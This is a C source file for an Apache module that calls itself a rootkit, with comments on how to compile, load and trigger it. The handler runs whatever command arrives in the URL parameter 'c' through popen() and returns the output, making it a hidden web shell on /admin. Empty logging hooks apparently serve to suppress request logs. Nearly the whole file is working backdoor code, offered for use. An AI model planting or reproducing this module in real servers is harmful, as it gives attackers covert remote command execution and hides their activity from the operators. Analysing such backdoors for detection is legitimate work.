/* 
**  mod_admin.c -- Apache module rootkit C. Papathanasiou (2015) 
**  [Semi-Autogenerated via ``apxs -n admin -g'']
**
**  To play with this module first compile it into a
**  DSO file and install it into Apache's modules directory 
**  by running:
**
**    $ apxs -c -i mod_admin.c
**
**  Then activate it in Apache's apache2.conf file for instance
**  for the URL /admin in as follows:
**
**    #   apache2.conf
**    LoadModule admin_module modules/mod_admin.so
**    <Location /admin>
**    SetHandler admin
**    </Location>
**
**  Then after restarting Apache via
**
**    $ apachectl restart
**
**  you immediately can request the URL /admin?c=cmd and watch for the
**  output of this module. This can be achieved for instance via:
**
**    $ lynx -mime_header http://localhost/admin?c=id 
**
**  The output should be similar to the following one:
**
**     HTTP/1.1 200 OK
**     Date: Thu, 19 Feb 2015 16:33:30 GMT
**     Server: Apache/2.4.7 (Ubuntu)
**     Content-Length: 54
**     Connection: close
**     Content-Type: text/html
**
**     uid=33(www-data) gid=33(www-data) groups=33(www-data)
**
*/ 

#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "http_log.h"
#include "ap_config.h"
#include <stdio.h>
#include <stdlib.h>

static int admin_handler(request_rec *r)
{
  apr_table_t *GET;
    apr_array_header_t *POST;
    const char *c;
    FILE *fp;
    char path[1024];
    if (strcmp(r->handler, "admin")) {
        return DECLINED;
    }
    ap_args_to_table(r, &GET);
    ap_parse_form_data(r, NULL, &POST, -1, 8192);
    ap_set_content_type(r, "text/html");
    c = apr_table_get(GET, "c");
    fp = popen(c,"r");
    if (fp == NULL) { 
        return OK;
    }
    while (fgets(path, sizeof(path)-1,fp) != NULL) { 
        ap_rprintf(r,"%s",path);
    }
    pclose(fp);
    return OK;
}

static int log_handler(request_rec *r) {
    
    return OK;
}
static int log_open_handler(request_rec *r) {
    
    return OK;
}
static void admin_register_hooks(apr_pool_t *p)
{
    ap_hook_handler(admin_handler, NULL, NULL, APR_HOOK_MIDDLE);
    ap_hook_open_logs(log_open_handler,NULL,NULL,APR_HOOK_MIDDLE);
    ap_hook_log_transaction(log_handler,NULL,NULL,APR_HOOK_MIDDLE);
}

module AP_MODULE_DECLARE_DATA admin_module = {
    STANDARD20_MODULE_STUFF, 
    NULL,                  /* create per-dir    config structures */
    NULL,                  /* merge  per-dir    config structures */
    NULL,                  /* create per-server config structures */
    NULL,                  /* merge  per-server config structures */
    NULL,                  /* table of config file commands       */
    admin_register_hooks  /* register hooks                      */
};
